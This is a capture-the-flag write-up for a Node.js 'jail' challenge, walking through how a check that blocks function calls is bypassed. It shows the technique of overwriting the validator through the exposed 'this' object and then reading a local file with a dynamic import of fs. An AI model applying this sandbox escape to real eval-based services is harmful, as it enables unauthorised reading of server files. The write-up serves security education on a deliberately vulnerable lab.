
> I hate functions. I hate them so much, that I made it so that you can never call them!
> 
> Note: Solving this challenge will unlock another challenge, "JS Blacklist".
> 
> Author: SteakEnthusiast
> 
> `nc 34.172.149.49 5000`
> 


We are given a Node.js console when connecting to the IP address. From the Dockerfile we are given, we can see that the flag file is in the same working directory as the chal.js file that is running. 

Inspecting chal.js, we see that the following function checks if there any CallExpressions, i.e. functions being called:

```\\ Check if any functions are called
noCallExpressions(ast) {
    let hasCallExpression = false;
    traverse(ast, {
      CallExpression(path) {
        hasCallExpression = true;
        path.stop();
      },
    });
    return !hasCallExpression;
  }
```
 If there are CallExpressions, the program does not eval the inputted line, otherwise it does and prints the return value.

Writing `this` returns the entire Jail object. Thus, we can change the noCallExpressions function in the Jail object to always return true. Note that this must not be calling anything.

`this.noCallExpressions = (ast) => {return true;}`

Then, we can call whatever we want. Since we want to read the contents of the flag file, we can use the `fs` module. To import it within an eval call, we have to use an async function and dynamic import:

`(async () => { const fs = await import('fs'); const fileContents = fs.readFileSync('flag', 'utf8'); console.log(fileContents); })();`

This logs the contents of the flag file: uoftctf{b4by_j4v4scr1p7_gr3w_up_4nd_b3c4m3_4_h4ck3r}